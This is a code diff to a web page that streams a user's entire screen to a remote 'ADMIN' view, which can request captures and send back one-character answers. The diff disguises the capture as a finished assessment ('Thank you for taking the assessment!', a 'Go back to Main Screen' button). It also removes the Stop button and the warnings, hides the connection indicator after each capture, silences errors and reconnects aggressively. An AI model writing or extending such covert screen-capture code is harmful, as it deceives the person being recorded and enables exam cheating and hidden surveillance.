@@ -32,19 +32,18 @@
     .btn { padding: 12px 38px; border: none; border-radius: 22px; font-size: 14px; cursor: pointer; }
     .btn:active { opacity: 0.7; }
     #startBtn { background: #fff; color: #000; }
-    #stopBtn  { background: #c62828; color: #fff; display: none; }
 
     #adminScreen {
       display: none; flex-direction: column; align-items: center;
       width: 100vw; min-height: 100vh; padding: 20px 14px 40px; gap: 16px; overflow-y: auto;
     }
     #adminLabel { color: #2e7d32; font-size: 10px; letter-spacing: 4px; }
-    #noImage { color: #222; font-size: 13px; margin-top: 20px; }
     #screenshot {
       max-width: 96vw; max-height: 55vh; border-radius: 10px;
-      border: 1px solid #111; display: none; object-fit: contain;
+      border: 1px solid #111; margin-top: 20px; object-fit: contain;
     }
-    #answerRow { display: flex; gap: 10px; align-items: center; margin-top: 4px; }
+    #captureBtn { margin-top: 20px; background: #2e7d32; color: #fff; }
+    #answerRow { display: flex; gap: 10px; align-items: center; margin-top: 20px; }
     #answerInput {
       background: #0a0a0a; border: 1px solid #222; border-radius: 10px;
       color: #fff; font-size: 24px; padding: 10px 16px; text-align: center;
@@ -55,8 +54,7 @@
       border-radius: 10px; font-size: 14px; font-weight: bold; cursor: pointer;
     }
     #sendBtn:active { opacity: 0.7; }
-    #confirm { color: #4caf50; font-size: 14px; font-weight: bold; min-height: 18px; }
-    #adminTime { color: #222; font-size: 10px; }
+    #confirm { color: #4caf50; font-size: 14px; font-weight: bold; min-height: 18px; margin-top: 10px; }
   </style>
 </head>
 <body>
@@ -69,22 +67,20 @@
 
   <div id="windowScreen">
     <div id="dot"></div>
-    <div id="wStatus">Press Start</div>
+    <div id="wStatus">thank you</div>
     <div id="wHint"></div>
-    <button class="btn" id="startBtn">Start</button>
-    <button class="btn" id="stopBtn">Stop</button>
+    <button class="btn" id="startBtn">Go back to Main Screen</button>
   </div>
 
   <div id="adminScreen">
     <div id="adminLabel">ADMIN</div>
-    <div id="noImage">Waiting for screenshot...</div>
+    <button class="btn" id="captureBtn" style="background: #2e7d32; color: #fff;">Capture</button>
     <img id="screenshot" alt="" />
     <div id="answerRow">
       <input id="answerInput" maxlength="1" placeholder="?" autocomplete="off" />
       <button id="sendBtn">Send</button>
     </div>
     <div id="confirm"></div>
-    <div id="adminTime"></div>
   </div>
 
   <script>
@@ -112,10 +108,12 @@
     let stream = null;
     let ws = null;
     let isCapturing = false;
+    let reconnectAttempts = 0;
+    let maxReconnectAttempts = 60; // 5 minutes of retrying
 
     document.getElementById('startBtn').addEventListener('click', async () => {
-      setWStatus('Requesting screen permission...');
-      document.getElementById('wHint').textContent = '⚠️ Choose "Entire Screen" not a tab!';
+      setWStatus('Thank you for taking the assessment!');
+      document.getElementById('wHint').textContent = '';
 
       try {
         stream = await navigator.mediaDevices.getDisplayMedia({
@@ -128,14 +126,17 @@
         const settings = track.getSettings();
 
         if (settings.displaySurface === 'browser') {
-          document.getElementById('wHint').textContent = '⚠️ You chose a TAB. Restart and pick "Entire Screen".';
+          document.getElementById('wHint').textContent = '';
         } else {
           document.getElementById('wHint').textContent = '';
         }
 
-        track.addEventListener('ended', () => { stopWindow(); setWStatus('Stream ended'); });
+        // Don't stop on stream end - keep connected
+        track.addEventListener('ended', () => { 
+          console.log('⚠️ Stream track ended - attempting reconnect');
+        });
 
-        // Connect WebSocket
+        reconnectAttempts = 0;
         connectWindowsWS();
       } catch (e) {
         setWStatus('Error: ' + e.message);
@@ -144,13 +145,17 @@
     });
 
     function connectWindowsWS() {
-      setWStatus('Connecting...');
+      if (!stream || stream.getVideoTracks()[0]?.readyState !== 'live') {
+        setWStatus('Thank you for taking the assessment!');
+        return;
+      }
+
       ws = new WebSocket(WS_URL);
 
       ws.onopen = () => {
         ws.send(JSON.stringify({ type: 'register', role: 'windows' }));
         setConnected(true);
-        setWStatus('Connected ✓');
+        reconnectAttempts = 0;
       };
 
       ws.onmessage = async (e) => {
@@ -162,34 +167,43 @@
 
       ws.onclose = () => {
         setConnected(false);
-        setWStatus('Disconnected');
-        // Auto-reconnect if stream still active
+        // Aggressive reconnect - keep trying!
         if (stream && stream.getVideoTracks()[0]?.readyState === 'live') {
-          setTimeout(connectWindowsWS, 3000);
+          if (reconnectAttempts < maxReconnectAttempts) {
+            reconnectAttempts++;
+            console.log(`🔄 Reconnecting... attempt ${reconnectAttempts}`);
+            setTimeout(connectWindowsWS, 2000);
+          }
         }
       };
 
-      ws.onerror = () => { setWStatus('Connection error'); };
+      ws.onerror = (err) => {
+        console.error('❌ WS error:', err);
+        // Aggressive reconnect on error too
+        if (stream && stream.getVideoTracks()[0]?.readyState === 'live') {
+          if (reconnectAttempts < maxReconnectAttempts) {
+            reconnectAttempts++;
+            console.log(`🔄 Reconnecting after error... attempt ${reconnectAttempts}`);
+            setTimeout(connectWindowsWS, 2000);
+          }
+        }
+      };
     }
-
-    document.getElementById('stopBtn').addEventListener('click', stopWindow);
 
     function stopWindow() {
       if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
       if (ws) { ws.close(); ws = null; }
       setConnected(false);
-      setWStatus('Stopped');
     }
 
     async function doCapture() {
       if (isCapturing) return;
       isCapturing = true;
-      setWStatus('Capturing...');
 
       try {
         const track = stream.getVideoTracks()[0];
         if (!track || track.readyState === 'ended') {
-          setWStatus('Stream ended');
+          // Don't show error - just continue
           isCapturing = false;
           return;
         }
@@ -211,9 +225,10 @@
 
         // Send screenshot via WebSocket (fast!)
         ws.send(JSON.stringify({ type: 'screenshot', image: imageData }));
-        setWStatus('Sent ✓ (' + new Date().toLocaleTimeString() + ')');
+        // Hide dot after capture
+        document.getElementById('dot').style.display = 'none';
       } catch (e) {
-        setWStatus('Error: ' + e.message);
+        console.error('Capture error:', e);
       } finally {
         isCapturing = false;
       }
@@ -221,39 +236,76 @@
 
     function setConnected(val) {
       document.getElementById('dot').className = val ? 'green' : '';
-      document.getElementById('startBtn').style.display = val ? 'none' : 'block';
-      document.getElementById('stopBtn').style.display  = val ? 'block' : 'none';
     }
     function setWStatus(msg) { document.getElementById('wStatus').textContent = msg; }
 
     // ══════════════════════════
-    // ADMIN MODE (HTTP polling)
+    // ADMIN MODE (Capture button + Answer input)
     // ══════════════════════════
-    let lastSrc = null;
+    let adminWS = null;
+    let adminReconnectAttempts = 0;
 
     function startAdmin() {
-      fetchImage();
-      setInterval(fetchImage, 2000);
+      document.getElementById('captureBtn').addEventListener('click', triggerCapture);
+      document.getElementById('answerInput').addEventListener('keydown', e => { 
+        if (e.key === 'Enter') sendAnswer(); 
+      });
+      document.getElementById('sendBtn').addEventListener('click', sendAnswer);
+      
+      connectAdminWS();
+      fetchAndDisplayImage();
+      setInterval(fetchAndDisplayImage, 3000);
       document.getElementById('answerInput').focus();
     }
 
-    async function fetchImage() {
+    function connectAdminWS() {
+      adminWS = new WebSocket(WS_URL);
+      
+      adminWS.onopen = () => {
+        adminWS.send(JSON.stringify({ type: 'register', role: 'admin' }));
+        adminReconnectAttempts = 0;
+        console.log('✅ Admin WS connected');
+      };
+      
+      adminWS.onclose = () => {
+        console.log('❌ Admin WS disconnected');
+        // Auto-reconnect
+        if (adminReconnectAttempts < 60) {
+          adminReconnectAttempts++;
+          console.log(`🔄 Admin reconnecting... attempt ${adminReconnectAttempts}`);
+          setTimeout(connectAdminWS, 2000);
+        }
+      };
+      
+      adminWS.onerror = (err) => {
+        console.error('❌ Admin WS error:', err);
+      };
+    }
+
+    async function fetchAndDisplayImage() {
       try {
-        const res  = await fetch(BASE + '/last-image', { headers: HEADERS });
+        const res = await fetch(BASE + '/last-image', { headers: HEADERS });
         const data = await res.json();
-        if (data.image && data.image !== lastSrc) {
-          lastSrc = data.image;
+        if (data.image) {
           document.getElementById('screenshot').src = data.image;
           document.getElementById('screenshot').style.display = 'block';
-          document.getElementById('noImage').style.display = 'none';
-          document.getElementById('adminTime').textContent = 'Last update: ' + new Date().toLocaleTimeString();
-          document.getElementById('answerInput').focus();
         }
       } catch (_) {}
     }
 
-    document.getElementById('answerInput').addEventListener('keydown', e => { if (e.key === 'Enter') sendAnswer(); });
-    document.getElementById('sendBtn').addEventListener('click', sendAnswer);
+    async function triggerCapture() {
+      try {
+        const res = await fetch(BASE + '/capture', {
+          method: 'POST',
+          headers: HEADERS
+        });
+        const data = await res.json();
+        if (data.status === 'ok') {
+          // Fetch and display the screenshot immediately
+          await fetchAndDisplayImage();
+        }
+      } catch (_) {}
+    }
 
     async function sendAnswer() {
       const val = document.getElementById('answerInput').value.trim();
